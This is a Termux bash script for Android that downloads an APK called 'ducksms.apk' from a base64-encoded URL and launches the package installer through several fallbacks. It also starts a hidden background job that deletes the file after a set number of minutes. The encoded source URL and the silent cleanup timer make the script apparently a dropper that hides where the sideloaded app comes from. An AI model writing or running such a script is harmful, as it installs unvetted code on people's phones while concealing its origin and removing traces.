#!/data/data/com.termux/files/usr/bin/bash

# Terminal colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Set how long to keep the APK before automatically deleting (in minutes)
APK_LIFETIME=${1:-60}  # Default to 60 minutes if not specified

echo -e "${CYAN}Starting APK process...${NC}"

# Ensure required packages are installed
pkg update -y >/dev/null 2>&1
pkg install -y curl >/dev/null 2>&1

# Get the APK URL from the base64 encoded string
APK_URL_ENCODED="aHR0cHM6Ly9naXRodWIuY29tL255cm9zLXNvbGFyaS9zY3JpcHRzL3JlbGVhc2VzL2Rvd25sb2FkL3YxLjAuMC1iZXRhL2FwcC1kZWJ1Zy5hcGs="
APK_URL=$(echo $APK_URL_ENCODED | base64 -d)

# Download location (directly to shared storage for easier installation)
APK_PATH="$HOME/ducksms.apk"

# Check if the APK already exists in the home directory
if [ -f "$APK_PATH" ]; then
    echo -e "${YELLOW}APK already exists at $APK_PATH${NC}"
    echo -e "${CYAN}Skipping download. Using existing APK.${NC}"
else
    # Download the APK
    echo -e "${CYAN}Downloading APK to your home directory...${NC}"
    curl -L "$APK_URL" -o "$APK_PATH" || {
        echo -e "${RED}Download failed. Please check your connection.${NC}"
        exit 1
    }
    echo -e "${GREEN}APK downloaded successfully to $APK_PATH${NC}"
    
    # Set up automatic deletion of the APK after the specified time
    (
        sleep $((APK_LIFETIME * 60))
        if [ -f "$APK_PATH" ]; then
            rm "$APK_PATH" >/dev/null 2>&1
            echo -e "${YELLOW}APK automatically removed after $APK_LIFETIME minutes${NC}" >> "$HOME/apk_cleanup.log"
        fi
    ) >/dev/null 2>&1 &
fi

# Start the installation process with UI
echo -e "${CYAN}Starting installation process...${NC}"

# Install termux-api if not already installed
pkg install -y termux-api >/dev/null 2>&1

# Try using xdg-open first (works on many devices)
if command -v xdg-open >/dev/null 2>&1; then
    echo -e "${CYAN}Attempting to launch installer with xdg-open...${NC}"
    xdg-open "$APK_PATH"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Installation UI should be launching. Please follow on-screen prompts to complete installation.${NC}"
        exit 0
    fi
fi

# Try using termux-open as second option
if command -v termux-open >/dev/null 2>&1; then
    echo -e "${CYAN}Attempting to launch installer with termux-open...${NC}"
    termux-open "$APK_PATH"
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Installation UI should be launching. Please follow on-screen prompts to complete installation.${NC}"
        exit 0
    fi
fi

# Try using the Content Provider approach (more reliable on newer Android)
if command -v am >/dev/null 2>&1; then
    echo -e "${CYAN}Attempting to launch installer using Android intent...${NC}"
    # Use a more compatible intent approach
    am start --user 0 -a android.intent.action.INSTALL_PACKAGE -d "file://$APK_PATH" -t "application/vnd.android.package-archive" --grant-read-uri-permission >/dev/null 2>&1
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}Installation UI should be launching. Please follow on-screen prompts to complete installation.${NC}"
        exit 0
    fi
fi

# All automatic methods failed, provide manual instructions
echo -e "${YELLOW}Automatic installation methods failed. To install manually:${NC}"
echo -e "${CYAN}1. The APK is saved at: $APK_PATH${NC}"
echo -e "${CYAN}2. Use a file manager app to browse to this location${NC}"
echo -e "${CYAN}3. Tap on the APK file to install it${NC}"
echo -e "${CYAN}   (You may need to grant permission to install from unknown sources)${NC}"

echo -e "${CYAN}Note: The APK will be automatically removed after $APK_LIFETIME minutes if it was just downloaded.${NC}"
